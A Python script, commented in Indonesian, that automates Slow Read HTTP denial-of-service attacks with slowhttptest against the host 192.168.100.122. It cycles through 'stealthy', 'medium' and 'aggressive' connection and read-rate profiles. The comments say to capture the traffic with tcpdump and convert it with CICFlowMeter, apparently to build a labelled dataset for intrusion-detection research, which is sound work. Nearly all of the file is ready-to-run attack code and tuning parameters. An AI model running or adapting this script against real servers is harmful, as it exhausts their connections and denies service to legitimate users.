## attack 1 jam dengan attack parameter seperti di bawah ini

# slowhttptest -c <attack> -r <connections> -X -t GET -u http://192.168.100.122 -z <readrate>
# ini contoh yang aku pakai selama ini, tapi bisa diubah sesuai kebutuhan aka lebih sederhana

# Attack      : 100 (default)
# Connections : 50 (default)
# Runtime     : 300 sec
# Read Rate : 32/5
# Follow-up   : -

# Attack      : 200 (default)
# Connections : 50 (default)
# Runtime     : 240 sec
# Read Rate : 5/1, 10/5, 15/5
# Follow-up   : -

# Attack      : 300 (default)
# Connections : 50 (default)
# Runtime     : 240 sec
# Read Rate : 5/1, 5/1, 15/1
# Follow-up   : -

# Attack      : 500 (default)
# Connections : 50 (default)
# Runtime     : 240 sec
# Read Rate : 10/5, 15/5
# Follow-up   : -

# Attack      : 600 (default)
# Connections : 50 (default)
# Runtime     : 240 sec
# Read Rate : 10/5, 15/5
# Follow-up   : -

## saat attack ini jangan lupa trafficnya dicapture dengan tcpdump dan pcap taruh di /home/victim/project/data/pcap/. terserah yang mana duluan tcpdump atau attack command, yang penting capture seluruh trafficnya

## dari pcap itu langsung convert ke csv dengan cicflowmeter dan taruh di /home/victim/project/data/csv/ dengan nama file sesuai dengan nama pcapnya, misal pcapnya slowread.pcap maka csvnya jadi slowread.csv

import subprocess
import time
import sys

TARGET_URL = "http://192.168.100.122"


# Ambil parameter type dan durasi dari argumen command-line
if len(sys.argv) > 2:
    try:
        TYPE = int(sys.argv[1])
        TOTAL_RUNTIME = int(sys.argv[2])
    except ValueError:
        print("Usage: python3 slowread_attack.py <type> <time>")
        print("type: 0=stealthy, 1=medium, 2=aggresive, 3=all")
        print("time: total seconds")
        sys.exit(1)
else:
    print("Usage: python3 slowread_attack.py <type> <time>")
    print("type: 0=stealthy, 1=medium, 2=aggresive, 3=all")
    print("time: total seconds")
    sys.exit(1)


# List of attack configurations: (attack_name, total_connections, rate, readrate_list, runtime)
attack_configs = [
    ("attack_100", 100, 50, ["32/5"], 300),  # 0 stealthy
    ("attack_200", 200, 50, ["5/1", "10/5", "15/5"], 240), # 0 stealthy
    ("attack_300", 300, 50, ["5/1", "5/1", "15/1"], 240),  # 1 medium
    ("attack_500", 500, 50, ["10/5", "15/5"], 240),         # 2 aggresive
    ("attack_600", 600, 50, ["10/5", "15/5"], 240),         # 2 aggresive
]

# Mapping type to which configs to use
type_to_indices = {
    0: [0, 1],        # stealthy
    1: [2],           # medium
    2: [3, 4],        # aggresive
    3: [0, 1, 2, 3, 4], # all
}

# Runtime per attack (detik)
RUNTIME_PER_ATTACK = 240

def run_attack(attack_name, total_connections, rate, readrate_list, runtime):
    for readrate in readrate_list:
        print(f"\n[INFO] Menjalankan attack: {attack_name}, total_connections: {total_connections}, rate: {rate}, runtime: {runtime}, readrate: {readrate}")
        attack_cmd = f"slowhttptest -c {total_connections} -r {rate} -X -t GET -u {TARGET_URL} -z {readrate} -w 8 -y 16 -l {runtime}"
        print(f"[INFO] Menjalankan: {attack_cmd}")
        subprocess.run(attack_cmd, shell=True)

if __name__ == "__main__":
    if TYPE not in type_to_indices:
        print("Tipe tidak valid. Gunakan 0=stealthy, 1=medium, 2=aggresive, 3=all.")
        sys.exit(1)
    selected_indices = type_to_indices[TYPE]
    selected_attacks = [attack_configs[i] for i in selected_indices]
    start_time = time.time()
    while True:
        for attack_name, total_connections, rate, readrates, runtime in selected_attacks:
            elapsed = time.time() - start_time
            if elapsed >= TOTAL_RUNTIME:
                print(f"\n[INFO] Waktu total {TOTAL_RUNTIME} detik sudah tercapai. Selesai.")
                sys.exit(0)
            run_attack(attack_name, total_connections, rate, readrates, runtime)